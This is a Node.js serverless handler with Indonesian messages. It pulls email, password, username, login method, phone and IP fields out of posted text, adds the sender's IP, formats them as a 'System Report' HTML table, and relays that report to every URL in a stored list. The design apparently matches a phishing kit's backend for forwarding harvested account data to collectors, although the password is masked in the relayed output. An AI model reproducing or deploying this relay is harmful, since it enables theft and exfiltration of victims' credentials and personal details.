const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   SAFE LOAD & SAVE URL (FIX 500)
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");

    if (!data) return [];

    try {
      return JSON.parse(data);
    } catch (e) {
      console.log("JSON ERROR:", e.message);
      return [];
    }

  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

function saveUrls(data) {
  try {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.log("SAVE ERROR:", e.message);
  }
}

/* ======================
   NORMALIZE KEY
====================== */
function normalizeKey(key = "") {
  key = key.toLowerCase();

  const map = {
    email: ["email", "e-mail", "mail"],
    password: ["password", "pass", "kata sandi", "sandi", "pwd"],
    user: ["user", "username", "nama", "name"],
    login: ["login", "login via", "auth"],
    phone: ["phone", "hp", "no hp", "nomor", "telepon"],
    ip: ["ip", "ip address"],
  };

  for (const k in map) {
    if (map[k].some(x => key.includes(x))) return k;
  }

  return key.replace(/\s+/g, "_");
}

/* ======================
   CLEAN HTML
====================== */
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, "\n");
}

/* ======================
   EXTRACT VARS
====================== */
function extractVars(input = "") {
  const vars = {};
  const html = stripHtml(input);

  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const keyRaw = m[1].replace(/<[^>]*>/g, "").trim();
    const value = m[2].replace(/<[^>]*>/g, "").trim();

    const key = normalizeKey(keyRaw);

    if (value) vars[key] = value;
  }

  const lines = html.split("\n");

  for (const line of lines) {
    const clean = line.replace(/<[^>]*>/g, "").trim();
    const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);

    if (m2) {
      const key = normalizeKey(m2[1].trim());
      const value = m2[2].trim();

      if (value) vars[key] = value;
    }
  }

  if (!vars.password) {
    const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
    if (passMatch) vars.password = passMatch[2];
  }

  return vars;
}

/* ======================
   BUILD HTML
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;background:#0f172a;font-family:Arial;color:#e5e7eb;padding:20px">

<div style="max-width:700px;margin:auto;background:#111827;border-radius:10px;overflow:hidden">

  <div style="padding:18px;background:#0b1220;text-align:center">
    <h2 style="margin:0">System Report</h2>
    <small style="color:#94a3b8">Auto Generated</small>
  </div>

  <div style="padding:20px">
    <table style="width:100%;border-collapse:collapse">

      <tr><td>User</td><td>${vars.user || "-"}</td></tr>
      <tr><td>Email</td><td>${vars.email || "-"}</td></tr>
      <tr><td>Password</td><td>***REDACTED***</td></tr>
      <tr><td>Login</td><td>${vars.login || "-"}</td></tr>
      <tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
      <tr><td>IP</td><td>${vars.ip || "-"}</td></tr>

    </table>
  </div>

</div>

</body>
</html>
`;
}

/* ======================
   🔥 ANTI SPAM (SUBJEK + PESAN ONLY)
====================== */
function containsSpamPattern(text = "") {
  const t = String(text).toLowerCase();

  const spamPatterns = [
    /free\s+money/,
    /klik\s+di\s+sini/i,
    /wa\s*me/i,
    /http[s]?:\/\//gi,
    /bit\.ly|tinyurl|cutt\.ly/i,
    /(.)\1{6,}/,
    /buy\s+now|order\s+now/i,
    /pinjaman|kredit\s+cepat/i,
    /xxx|porn|sex/i
  ];

  return spamPatterns.some((p) => p.test(t));
}

function spamScore(text = "") {
  let score = 0;
  const t = String(text).toLowerCase();

  if (t.includes("http")) score += 2;
  if (/(.)\1{5,}/.test(t)) score += 2;
  if (t.length > 2000) score += 1;
  if (/[A-Z]{10,}/.test(text)) score += 1;

  return score;
}

/* ======================
   FETCH SAFE (FIX 500)
====================== */
let fetchFn;

try {
  fetchFn = global.fetch || require("node-fetch");
} catch (e) {
  fetchFn = null;
}

const Controller =
  global.AbortController ||
  (typeof require !== "undefined" ? require("abort-controller") : null);

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = req.body || {};
    const subjek = body.subjek || "";
    const pesan = body.pesan || "";

    /* ======================
       ANTI SPAM CHECK (ONLY SUBJEK & PESAN)
    ====================== */
    if (containsSpamPattern(subjek) || spamScore(subjek) >= 2) {
      return res.status(400).json({
        success: false,
        message: "Subjek terdeteksi spam"
      });
    }

    if (containsSpamPattern(pesan) || spamScore(pesan) >= 3) {
      return res.status(400).json({
        success: false,
        message: "Pesan terdeteksi spam"
      });
    }

    const vars = extractVars(pesan);

    vars.ip =
      vars.ip ||
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!Array.isArray(urls) || urls.length === 0) {
      return res.json({ success: false, message: "URL kosong" });
    }

    /* ======================
       SAFE PARALLEL REQUEST
    ====================== */
    const results = await Promise.allSettled(
      urls.map(async (url) => {
        let attempt = 0;

        while (attempt < 2) {
          attempt++;

          try {
            const controller = Controller ? new Controller() : null;
            const timeout = controller
              ? setTimeout(() => controller.abort(), 8000)
              : null;

            if (!fetchFn) throw new Error("Fetch not available");

            const r = await fetchFn(url, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                subjek,
                pesan: html
              }),
              signal: controller?.signal
            });

            if (timeout) clearTimeout(timeout);

            return {
              url,
              success: true,
              status: r.status
            };

          } catch (err) {
            if (attempt >= 2) {
              return {
                url,
                success: false,
                error: err?.message || "UNKNOWN_ERROR"
              };
            }
          }
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("FATAL ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error (fixed safe mode)",
      error: err?.message || "UNKNOWN"
    });
  }
};
